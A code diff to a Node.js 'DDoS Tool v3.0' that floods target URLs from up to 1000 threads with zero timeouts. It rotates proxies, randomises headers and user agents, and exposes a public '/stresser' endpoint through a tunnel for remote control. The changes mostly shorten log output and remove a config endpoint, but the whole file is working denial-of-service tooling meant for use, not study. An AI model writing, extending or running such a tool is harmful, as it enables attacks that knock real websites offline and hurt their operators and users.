@@ -2,6 +2,7 @@ const express = require("express");
 const axios = require("axios");
 const fs = require("fs");
 const path = require("path");
+const http = require("http");
 const { randomHeaders, randomUserAgent } = require('random-headers');
 const { SocksProxyAgent } = require("socks-proxy-agent");
 const { HttpsProxyAgent } = require("https-proxy-agent");
@@ -19,30 +20,12 @@ const stateFilePath = path.join(__dirname, "attackState.json");
 const REQUESTS_PER_THREAD = process.env.PER_THREAD || 3;
 const numThreads = process.env.MAX_THREADS || 1000;
 let totalRequestsSent = 0;
-let batchDurations = [];
 let nportUrl = null;
 let tunnelActive = false;
 
 axios.defaults.timeout = 0;
 axios.defaults.maxRedirects = 0;
 axios.defaults.validateStatus = () => true;
-
-const httpAgent = new http.Agent({
-  keepAlive: false,
-  maxSockets: Infinity,
-  maxFreeSockets: 256,
-  timeout: 0,
-  scheduling: 'fifo'
-});
-
-const httpsAgent = new https.Agent({
-  keepAlive: false,
-  maxSockets: Infinity,
-  maxFreeSockets: 256,
-  timeout: 0,
-  rejectUnauthorized: false,
-  scheduling: 'fifo'
-});
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -192,10 +175,10 @@ const performAttack = async (sessions, agent, threadId) => {
   totalRequestsSent += successfulRequests;
   
   const duration = Date.now() - startTime;
-  if (threadId === 0) {
+  if (threadId === 0 && duration > 0) {
     const rps = (successfulRequests / (duration / 1000)).toFixed(1);
     console.log(
-      `${colors.green('⚡')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Thread: ${threadId}`)}`
+      `${colors.green('⚡')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)}`
     );
   }
 
@@ -207,21 +190,20 @@ const performAttack = async (sessions, agent, threadId) => {
 const autoStartTunnel = async () => {
   const tunnelSubdomain = process.env.NPORT || "ddos";
   
-  console.log(colors.cyan(`\n🔗 Auto-starting nPort tunnel with subdomain: ${tunnelSubdomain}`));
+  console.log(colors.cyan(`\n🔗 Starting tunnel: ${tunnelSubdomain}`));
   try {
     const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: false });
     if (url) {
       nportUrl = url;
       tunnelActive = true;
-      console.log(colors.green(`✅ Tunnel active: ${nportUrl}`));
-      console.log(colors.yellow(`🌍 Public URL: ${nportUrl}/stresser`));
+      console.log(colors.green(`✅ Tunnel: ${nportUrl}`));
       return true;
     } else {
-      console.log(colors.red('❌ Failed to start tunnel, but continuing without tunnel'));
+      console.log(colors.red('❌ Tunnel failed'));
       return false;
     }
   } catch (err) {
-    console.log(colors.red(`❌ Tunnel error: ${err.message}, continuing without tunnel`));
+    console.log(colors.red(`❌ Tunnel error: ${err.message}`));
     return false;
   }
 };
@@ -234,7 +216,7 @@ const startAttack = async (url, durationHours) => {
 
   const proxies = loadProxies();
   if (!proxies.length) {
-    console.log(colors.red('No proxies found. Add proxies to proxy.txt'));
+    console.log(colors.red('No proxies found in proxy.txt'));
     return false;
   }
 
@@ -249,12 +231,11 @@ const startAttack = async (url, durationHours) => {
   state = { continueAttack, sessions };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
-  console.log(colors.green(`\n🚀 Attack Started on ${url} for ${durationHours} hour(s)`));
-  console.log(colors.cyan(`🔥 Threads: ${numThreads} | Requests/thread: ${REQUESTS_PER_THREAD}`));
-  console.log(colors.yellow(`⚡ Timeout: 0 (MAX SPEED) | Cache-Busting: ENABLED`));
+  console.log(colors.green(`\n🚀 Attack: ${url} for ${durationHours}h`));
+  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD}`));
   
   if (tunnelActive && nportUrl) {
-    console.log(colors.magenta(`🌐 Public Tunnel URL: ${nportUrl}`));
+    console.log(colors.magenta(`Public: ${nportUrl}`));
   }
   console.log('');
 
@@ -292,46 +273,43 @@ const stopAttack = async () => {
   state = { continueAttack: false, sessions: [] };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
-  console.log(colors.yellow(`\n🛑 Attack Stopped`));
-  console.log(colors.green(`Total Requests: ${formatNumber(totalRequestsSent)}\n`));
+  console.log(colors.yellow(`\n🛑 Stopped`));
+  console.log(colors.green(`Total: ${formatNumber(totalRequestsSent)}\n`));
 };
 
 const showStatus = () => {
   if (!continueAttack || sessions.length === 0) {
-    console.log(colors.yellow('No active attacks'));
+    console.log(colors.yellow('No active attack'));
     return;
   }
 
-  console.log(colors.cyan('\n=== ATTACK STATUS ==='));
+  console.log(colors.cyan('\n=== STATUS ==='));
   sessions.forEach((s) => {
     const remaining = ((s.startTime + s.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
-    console.log(`${colors.yellow('Target:')} ${s.url} | ${colors.gray(`Remaining: ${remaining}h`)}`);
+    console.log(`${colors.yellow('Target:')} ${s.url} | ${colors.gray(`${remaining}h left`)}`);
   });
-  console.log(`${colors.green('Total Requests:')} ${formatNumber(totalRequestsSent)}`);
+  console.log(`${colors.green('Requests:')} ${formatNumber(totalRequestsSent)}`);
   console.log(`${colors.cyan('Threads:')} ${numThreads}`);
-  console.log(`${colors.yellow('Timeout:')} 0 (MAX SPEED)`);
   if (tunnelActive && nportUrl) {
-    console.log(`${colors.magenta('Public URL:')} ${nportUrl}`);
+    console.log(`${colors.magenta('URL:')} ${nportUrl}`);
   }
   console.log('');
 };
 
 const showHelp = () => {
   console.log(colors.cyan('\n=== COMMANDS ==='));
-  console.log(`${colors.green('start <url> [hours]')}     - Start attack (MAX SPEED)`);
-  console.log(`${colors.green('stop')}                    - Stop attack`);
-  console.log(`${colors.green('status')}                  - Show status`);
-  console.log(`${colors.green('add <url> [hours]')}       - Add target`);
-  console.log(`${colors.green('remove <url>')}            - Remove target`);
-  console.log(`${colors.green('clear')}                   - Clear console`);
-  console.log(`${colors.green('help')}                    - This help`);
-  console.log(`${colors.green('exit')}                    - Exit\n`);
+  console.log(`${colors.green('start <url> [hours]')}  - Start attack`);
+  console.log(`${colors.green('stop')}                 - Stop`);
+  console.log(`${colors.green('status')}               - Status`);
+  console.log(`${colors.green('add <url> [hours]')}    - Add target`);
+  console.log(`${colors.green('remove <url>')}         - Remove`);
+  console.log(`${colors.green('clear')}                - Clear`);
+  console.log(`${colors.green('exit')}                 - Exit\n`);
 };
 
 const clearConsole = () => {
   console.clear();
-  console.log(colors.green('DDoS Tool v3.0 - MAX SPEED MODE'));
-  console.log(colors.gray('Timeout: 0 | No waiting | Maximum throughput'));
+  console.log(colors.green('DDoS Tool v3.0'));
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
@@ -416,19 +394,11 @@ app.get("/stresser", async (req, res) => {
     return res.status(400).json({ error: "Invalid URL" });
   }
   
-  console.log(colors.green(`[API] Starting attack on ${url}`));
   await startAttack(url, duration);
-  res.json({ 
-    success: true, 
-    message: `Attack started on ${url}`, 
-    duration: `${duration}h`,
-    tunnel: tunnelActive ? nportUrl : null,
-    speed: "MAX (timeout: 0)"
-  });
+  res.json({ success: true, message: `Attack started on ${url}` });
 });
 
 app.get("/stop", async (req, res) => {
-  console.log(colors.yellow('[API] Stopping attack'));
   await stopAttack();
   res.json({ success: true, totalRequests: totalRequestsSent });
 });
@@ -438,25 +408,7 @@ app.get("/status", (req, res) => {
     active: continueAttack,
     targets: sessions.map(s => s.url),
     totalRequests: totalRequestsSent,
-    threads: numThreads,
-    timeout: 0,
-    tunnel: tunnelActive ? nportUrl : null
-  });
-});
-
-app.get("/config", (req, res) => {
-  res.json({
-    tunnel: {
-      active: tunnelActive,
-      url: nportUrl,
-      subdomain: process.env.NPORT_SUBDOMAIN || "ddos"
-    },
-    attack: {
-      threads: parseInt(numThreads),
-      requestsPerThread: parseInt(REQUESTS_PER_THREAD),
-      timeout: 0,
-      maxSpeed: true
-    }
+    threads: numThreads
   });
 });
 
@@ -467,21 +419,12 @@ const port = process.env.PORT || 25694;
   
   app.listen(port, () => {
     console.clear();
-    console.log(colors.green(`\n⚡ DDoS Tool v3.0 - MAX SPEED MODE`));
-    console.log(colors.cyan(`🌐 Local API: http://localhost:${port}`));
-    console.log(colors.yellow(`⏱️  Timeout: 0 (NO WAITING - MAXIMUM SPEED)`));
+    console.log(colors.green(`\n⚡ DDoS Tool v3.0`));
+    console.log(colors.cyan(`Local: http://localhost:${port}`));
     if (tunnelActive && nportUrl) {
-      console.log(colors.magenta(`🌍 Public API: ${nportUrl}`));
-      console.log(colors.gray(`   ├─ ${nportUrl}/stresser?url=<URL>&duration=<HOURS>`));
-      console.log(colors.gray(`   ├─ ${nportUrl}/stop`));
-      console.log(colors.gray(`   └─ ${nportUrl}/status`));
+      console.log(colors.magenta(`Public: ${nportUrl}`));
     }
-    console.log(colors.gray(`\n📝 Examples:`));
-    console.log(colors.gray(`   curl "http://localhost:${port}/stresser?url=https://example.com&duration=2"`));
-    if (tunnelActive && nportUrl) {
-      console.log(colors.gray(`   curl "${nportUrl}/stresser?url=https://example.com&duration=2"`));
-    }
-    console.log(colors.green(`\n💡 Type "help" for commands\n`));
+    console.log(colors.green(`\nType "help" for commands\n`));
     
     rl.setPrompt(colors.red('ddos> '));
     rl.prompt();
